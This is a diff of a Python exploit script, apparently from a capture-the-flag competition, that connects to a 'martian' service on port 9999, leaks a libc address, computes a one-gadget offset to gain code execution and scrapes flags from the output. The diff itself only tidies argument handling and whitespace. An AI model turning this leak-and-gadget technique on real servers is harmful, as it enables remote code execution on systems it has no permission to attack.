@@ -1,8 +1,10 @@
 #!/usr/bin/env python
 from sploit_lib import *
 import re
-from time import sleep 
+import sys
+from time import sleep
 
+ip = sys.argv[1]
 flag_regexp = r"[A-Z0-9]{31}="
 
 leak_offset = 0x3eba00
@@ -10,7 +12,7 @@ one_shot = 0x10a38c
 
 if __name__ == "__main__":
 
-	p = remote( sys.argv[ 1 ], 9999 )
+	p = remote( ip, 9999 )
 	#p = process( "./martian" )
 	#gdb.attach( p )
 
@@ -56,7 +58,7 @@ if __name__ == "__main__":
 	base = leak - leak_offset
 
 	#print "libc_leak = 0x%x" % leak
-	#print "libcb_base = 0x%x" % base 
+	#print "libcb_base = 0x%x" % base
 
 	one_gadget = base + one_shot
 
@@ -71,7 +73,7 @@ if __name__ == "__main__":
 		if "Nowhere to run!" in buf:
 			p.send( "4\n" )
 			break
-		
+
 		p.send( "1\n" )
 
 	p.recvuntil( ": " )
@@ -85,5 +87,6 @@ if __name__ == "__main__":
 
 	buf = p.recv()
 	print re.findall( flag_regexp, buf )
+    sys.stdout.flush()
 
 	p.close()
